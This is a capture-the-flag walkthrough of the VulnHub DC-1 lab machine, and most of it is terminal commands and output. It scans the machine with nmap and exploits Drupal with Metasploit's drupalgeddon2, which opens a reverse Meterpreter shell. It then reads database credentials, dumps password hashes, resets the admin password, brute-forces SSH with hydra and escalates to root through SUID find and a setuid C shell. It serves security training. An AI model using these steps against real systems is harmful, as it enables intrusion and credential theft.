# DC-1: 1  
  
**URL: hxxps://www.vulnhub.com/entry/dc-1-1,292/**  
  
### NMAP  
  
root@kali:~# nmap -A 192.168.111.3  
>Starting Nmap 7.70 ( hxxps://nmap.org ) at 2019-04-16 09:30 CDT  
>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers  
>Nmap scan report for 192.168.111.3  
>Host is up (0.00064s latency).  
>Not shown: 997 closed ports  
>PORT    STATE SERVICE VERSION  
>22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)  
>| ssh-hostkey:   
>|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)  
>|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)  
>|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)  
>80/tcp  open  http    Apache httpd 2.2.22 ((Debian))  
>|_http-generator: Drupal 7 (hxxp://drupal.org)  
>| http-robots.txt: 36 disallowed entries (15 shown)  
>| /includes/ /misc/ /modules/ /profiles/ /scripts/   
>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt   
>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt   
>|_/LICENSE.txt /MAINTAINERS.txt  
>|_http-server-header: Apache/2.2.22 (Debian)  
>|_http-title: Welcome to Drupal Site | Drupal Site  
>111/tcp open  rpcbind 2-4 (RPC #100000)  
>| rpcinfo:   
>|   program version   port/proto  service  
>|   100000  2,3,4        111/tcp  rpcbind  
>|   100000  2,3,4        111/udp  rpcbind  
>|   100024  1          48991/tcp  status  
>|_  100024  1          59019/udp  status  
  
### DRUPAL  
  
Once we see that is running drupal version 7, it is pretty straight forward:  
  
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > run  
  
>\[\*\] Started reverse TCP handler on 192.168.111.5:4444   
>\[\*\] Drupal 7 targeted at hxxp://192.168.111.3/  
>\[\-\] Could not determine Drupal patch level  
>\[\*\] Sending stage (38247 bytes) to 192.168.111.3  
>\[\*\] Meterpreter session 1 opened (192.168.111.5:4444 -> 192.168.111.3:52352) at 2019-04-16 09:35:13 -0500  
  
meterpreter > sysinfo  
>Computer    : DC-1  
>OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686  
>Meterpreter : php/linux  

meterpreter > getuid  
>Server username: www-data (33)  
  
We pop up a interactive shell and start testing:  
  
>python -c 'import pty;pty.spawn("/bin/bash")'    

www-data@DC-1:/var/www$ hostname  
>DC-1  
  
www-data@DC-1:/var/www$ id  
>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
  
www-data@DC-1:/var/www$ cat flag1.txt  
>Every good CMS needs a config file - and so do you.  
  
www-data@DC-1:/var/www$ netstat -punta | grep LISTEN  
>(Not all processes could be identified, non-owned process info  
> will not be shown, you would have to be root to see it all.)  
>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                 
>tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                 
>tcp        0      0 0.0.0.0:48991           0.0.0.0:*               LISTEN      -                 
>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                 
>tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -       
  
We see a SMTP server that could lead to something and a mysql server. Let's explore that option first:  
  
www-data@DC-1:/var/www$ cat sites/default/settings.php   
>\<\?php  
>  
>\/\*\*  
> \*  
> \* flag2  
> \* Brute force and dictionary attacks aren't the  
> \* only ways to gain access (and you WILL need access).  
> \* What can you do with these credentials?  
> \*  
> \*\/  
>  
>$databases = array (  
>  'default' =>   
>  array (  
>    'default' =>   
>    array (  
>      'database' => 'drupaldb',  
>      'username' => 'dbuser',  
>      'password' => 'R0ck3t',  
>      'host' => 'localhost',  
>      'port' => '',  
>      'driver' => 'mysql',  
>      'prefix' => '',  
>    ),  
>  ),  
>);  
>  
  
We have already a valid mysql user:  
  
www-data@DC-1:/var/www$ mysql -u dbuser -p    
>Enter password: R0ck3t  
  
  
>mysql> select name,pass,mail,login,status from users;  
>select name,pass,mail,login,status from users;  
>  
>| name  | pass                                                    | mail              | login      | status |  
>  
>|       |                                                         |                   |          0 |      0 |  
>| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com | 1550582362 |      1 |  
>| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  | 1550582225 |      1 |  
>  
>3 rows in set (0.00 sec)  
  
No need to break their passwords, we can just change them.  
  
www-data@DC-1:/var/www$ drush user-password Fred --password="fred"  
>Changed password for Fred                                              [success]  
  
www-data@DC-1:/var/www$ drush user-password admin --password="admin"  
>Changed password for admin                                             [success]  
  
We log in as the admin and find a content page named flag3 with the following text:  
  
hxxp://192.168.111.3/node/2#overlay=admin/content  
  
>Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.  
  
Well, let's go back to our shell:  
  
www-data@DC-1:/var/www$ cat /etc/passwd  
>root\:x\:0:0:root:/root:/bin/bash  
>...  
>flag4\:x\:1001:1001:Flag4,,,:/home/flag4:/bin/bash  
  
There's a user named flag4. Let's brute force our way in:  
  
root@kali:~# hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.111.3  
>Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
>  
>Hydra (hxxps://github.com/vanhauser-thc/thc-hydra) starting at 2019-04-16 10:56:09  
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task  
>[DATA] attacking ssh://192.168.111.3:22/  
>[22][ssh] host: 192.168.111.3   login: flag4   password: orange  
>1 of 1 target successfully completed, 1 valid password found  
>[WARNING] Writing restore file because 2 final worker threads did not complete until end.  
>Hydra (hxxps://github.com/vanhauser-thc/thc-hydra) finished at 2019-04-16 10:57:11  
  
So easy.   
  
flag4@DC-1:~$ id  
>uid=1001(flag4) gid=1001(flag4) groups=1001(flag4)  
  
flag4@DC-1:~$ cat flag4.txt   
>Can you use this same method to find or access the flag in root?  
>  
>Probably. But perhaps it's not that easy.  Or maybe it is?  
  
Now, the final task. Get root.  
  
flag4@DC-1:~$ uname -a  
>Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux  
  
flag4@DC-1:~$ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null    
>-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount  
>-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping  
>-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su  
>-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6  
>-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount  
>-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh  
>-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd  
>-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp  
>-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn  
>-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd  
>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find  
>-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4  
>-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown  
>-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs  
  
Find it is.  
  
flag4@DC-1:~$ /usr/bin/find -exec whoami \;  
>root  
  
flag4@DC-1:~$ /usr/bin/find -exec id \;  
>uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)  
  
We can execute commands as root, so let's pop up a shell with a very simple c program:  
  
flag4DC-1:~$ cat shell.c   
>#include <stdio.h>  
>#include <stdlib.h>  
>#include <sys/types.h>  
>#include <unistd.h>  
>  
>int main()  
>{  
>setuid(0);  
>system("/bin/bash - ");  
>return 0;  
>}  
  
flag4@DC-1:~$ gcc shell.c -o shell  
  
flag4@DC-1:~$ /usr/bin/find -exec /home/flag4/shell \;  
  
root@DC-1:~# id  
>uid=0(root) gid=1001(flag4) groups=0(root),1001(flag4)  
  
root@DC-1:/root# cat thefinalflag.txt   
>Well done!!!!  
>  
>Hopefully you've enjoyed this and learned some new skills.  
>  
>You can let me know what you thought of this little journey  
>by contacting me via Twitter - @DCAU7  
  
Very simple machine, good for noobies but took an hour to solve. I post it because I hope it will help somebody :)
